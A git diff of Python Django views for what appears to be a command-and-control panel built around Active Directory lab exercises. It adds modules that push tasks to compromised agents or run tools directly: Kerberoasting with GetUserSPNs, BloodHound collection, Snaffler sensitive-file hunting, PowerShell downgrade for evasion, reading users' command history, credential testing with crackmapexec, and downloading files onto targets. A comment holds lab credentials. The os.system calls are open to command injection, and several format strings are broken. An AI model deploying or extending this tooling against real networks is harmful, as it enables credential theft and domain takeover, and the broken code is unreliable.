@@ -15,7 +15,7 @@ def linkedin_users(request, agent='' , comp='', linkedin_mail='' , linkedin_pass
     if request.method=='POST':   
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
-        os.system("echo '===============kerbrute O/P===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../general/linkedin2username/linkedin2username.py -c {comp} -u {linkedin_mail} -p {linkedin_password} -o {result_dir}".format(result_path,comp,linkedin_mail,linkedin_password,result_dir))
+        os.system("echo '===============linkedin_users===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../general/linkedin2username/linkedin2username.py -c {comp} -u {linkedin_mail} -p {linkedin_password} -o {result_dir}".format(result_path,comp,linkedin_mail,linkedin_password,result_dir))
     else:
         return render(request, 'blog/listeners.html')
 
@@ -57,13 +57,23 @@ def EnumSMBShares(request):
     else:
         return render(request, 'blog/listeners.html')
 
-#enum
-#crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
-def enum_withcreds(request, agent='' , ip='' , username='', password='' ):
+
+def TestingCreds_onDC(request, agent='' , ip='' , username='', password='' ):
     if request.method=='POST':
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
-        os.system("echo '===============kerbrute O/P===============\nOutPut in the following path:\n{result_dir}' >> {result_path};crackmapexec smb {ip} -u {username} -p {password} --users > CMEUsers".format(result_path,ip,username,password))
+        os.system("echo '===============Testing Credentials===============' >> {result_path};crackmapexec smb {ip} -u {username} -p {password} >> {result_path}".format(result_path,ip,username,password))
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+#enum
+#crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
+def userenum_withcreds(request, agent='' , ip='' , username='', password='' ):
+    if request.method=='POST':
+        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
+        result_path = result_dir+"results"
+        os.system("echo '===============CME Users===============\nOutPut in the following path:\n{result_dir}' >> {result_path};crackmapexec smb {ip} -u {username} -p {password} --users > {result_dir}CMEUsers".format(result_dir,result_path,ip,username,password))
     else:
         return render(request, 'blog/listeners.html')
 
@@ -152,6 +162,24 @@ def DefenseCheck(request, url='', outpath=''):
 
 
 #enum
+def systeminfo(request, url='', outpath=''):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        task = 'echo "===============systeminfo===============";systeminfo'
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+#enum
 def DomainInfo(request):
     if request.method=='POST':
         agent = request.POST['agent']
@@ -179,6 +207,25 @@ def DomainUsers(request, domain=''):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
         task = 'echo "===============USERS===============";Get-ADUser -Filter * | select UserPrincipalName;'.format(domain)
+        
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+def DomainControllers(request, domain=''):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        task = 'echo "===============Domain Controllers===============";import-module $env:USERPROFILE\powerview.ps1;get-domaincontroller -domain {}'.format(domain)
         
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -430,14 +477,14 @@ def TrustMap(request, agent=''):
         return render(request, 'blog/listeners.html')
 
 ##download on target    
-def DownloadWindows(request, url='', outpath=''):
+def DownloadonWindows(request, url='', outpath=''):
     if request.method=='POST':
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'iwr -Uri {} -OutFile {}'.format(url, outpath)
+        task = '[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";iwr -Uri {} -OutFile {}'.format(url, outpath)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -459,7 +506,115 @@ def sharp(request):
         password = request.POST['password']
         DCip = request.POST['DCip']
         DomainName = request.POST['DomainName']
-        os.system("bloodhound-python -u '{}' -p '{}' -ns {} -d {} -c all --zip".format(username,password,int(DCip),DomainName))
+        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
+        result_path = result_dir+"results"        
+        os.system("echo '===============SharpHound===============\nOutPut in the following path:\n{result_dir}' >> {result_path};cd {result_dir};bloodhound-python -u '{username}' -p '{password}' -ns {DCip} -d {DomainName} -c all --zip".format(result_dir,result_path,username,password,DCip,DomainName))
+    else:
+        return render(request, 'blog/listeners.html')
+
+#sensitive data collector
+def snaffler(request, url='', outpath=''):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        task = 'echo "===============Snaffler==============="\nOutPut in the following path:\n$env:USERPROFILE;.\$env:USERPROFILE\snaffler.exe -s -d {} -o $env:USERPROFILE\output.log -v data'.format(url, outpath)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+def DowngradePS(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        version = request.POST['version']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        task='powershell -version {}'.format(version)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+def processes(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        task='echo "===============Processes===============";wmic process list /format:list'
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+def Dsquery(request):
+    if request.method=='POST':
+        arg = request.POST['arg']
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        task='echo "===============DSquery===============";dsquery {}'.format(arg)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+
+def TGStickets_usingGetSPNusers(request):
+    if request.method=='POST':
+        DCip = request.POST['DCip']
+        domain = request.POST['domain']
+        username = request.POST['username'] #optional
+        password = request.POST['password'] #optional
+        username = request.POST['DCip'] #optional
+        aeskey = request.POST['hexkey'] #optional
+        hashes= request.POST['hashes'] #optional
+        agent = request.POST['agent']
+        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
+        result_path = result_dir+"results"
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        if username != '':
+            os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../general/GetUserSPNs.py -dc-ip {DCip} {domain}/{username}:{password} -o {result_dir}TGStickets -request".format(result_dir,result_path,username,password,domain,DCip))
+        else:
+            if hashes != '':
+                os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../general/GetUserSPNs.py -dc-ip {DCip} {domain} -hashes {hashes} -o {result_dir}TGStickets -request".format(result_dir,result_path,hashes,domain,DCip))
+
+            else:
+                os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../general/GetUserSPNs.py -dc-ip {DCip} {domain} -aeskey {aeskey} -o {result_dir}TGStickets -request".format(result_dir,result_path,aeskey, domain,DCip))
+    
+        return JsonResponse({},status=200)
+
     else:
         return render(request, 'blog/listeners.html')
 
@@ -483,26 +638,29 @@ def test_localAdmin(request, agent='', compName='', user='', password='', domain
         return render(request, 'blog/listeners.html')
 
 #enum
-# def usercommand_history(request, agent='', user=''):
-    # if request.method=='POST':
-    #     # if user=='':  #user field is optional
-    #     #     # task = 'echo "===============Specified user history===============";Get-Content C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt' 
-    #     # else:
-    #     #     task = 'echo "===============Specified user history===============";Get-Content C:\Users\{}\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt'.format(user)      
-    #     # task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
-    #     # with open(task_path, "w") as f:
-    #     #     f.write(task)
-    #     #     f.close()
-    # else:
-    #     return render(request, 'blog/listeners.html')
+def usercommand_history(request):
+    if request.method=='POST':
+        user = request.POST['user']
+        agent = request.POST['agent']
+        if user=='':  #user field is optional
+            task = 'echo "===============Specified user history===============";Get-Content $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt' 
+        else:
+            task = 'echo "===============Specified user history===============";Get-Content C:/users\{}\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt'.format(user)      
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+    else:
+        return render(request, 'blog/listeners.html')
 
 
 #enum
 # kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
-def KerpUserEnum(request, agent='' , domain='', dc_ip='', users_list='' , outputfile=''):
+def KerpUserEnum(request, agent='' , domain='', dc_ip='', users_list=''):
     if request.method=='POST':
-        result_path = "../data/listeners/agents/{}/results".format(agent)
-        os.system("echo '===============kerbrute O/P===============\nOutPut in the following path:\n{result_path}' >> {result_path};kerbrute userenum -d {domain} --dc {dc_ip} {users_list} | cut -d ':' -f 4 | sed 's/ //g' >> {outputfile} ".format(domain,dc_ip,users_list,result_path,outputfile))
+        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
+        result_path = result_dir+"results"
+        os.system("echo '===============kerbrute O/P===============\nOutPut in the following path:\n{result_dir}' >> {result_path};kerbrute userenum -d {domain} --dc {dc_ip} {users_list} | cut -d ':' -f 4 | sed 's/ //g' >> {result_dir}KerpUserEnum ".format(domain,dc_ip,users_list,result_path))
     else:
         return render(request, 'blog/listeners.html')
 
@@ -547,7 +705,7 @@ def llmnr_poison(request, agent='', time=0):
 
 def pass_policy(request, agent=''):
     if request.method=='POST':
-        task = 'echo "===============Password Policy===============";net accounts'
+        task = 'echo "===============Password Policy===============";net accounts /DOMAIN'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
